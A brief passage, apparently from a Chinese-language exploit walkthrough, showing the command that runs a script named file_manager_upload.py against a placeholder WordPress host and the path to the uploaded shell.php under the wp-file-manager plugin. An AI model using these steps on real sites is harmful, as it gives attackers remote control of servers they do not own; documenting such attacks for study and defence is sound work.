...
![img](https://tva1.sinaimg.cn/large/007S8ZIlgy1gjxwgz2pscj30za0icdiu.jpg)

访问http://x.x.x.x/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php



python3 file_manager_upload.py -u http://x.x.x.x
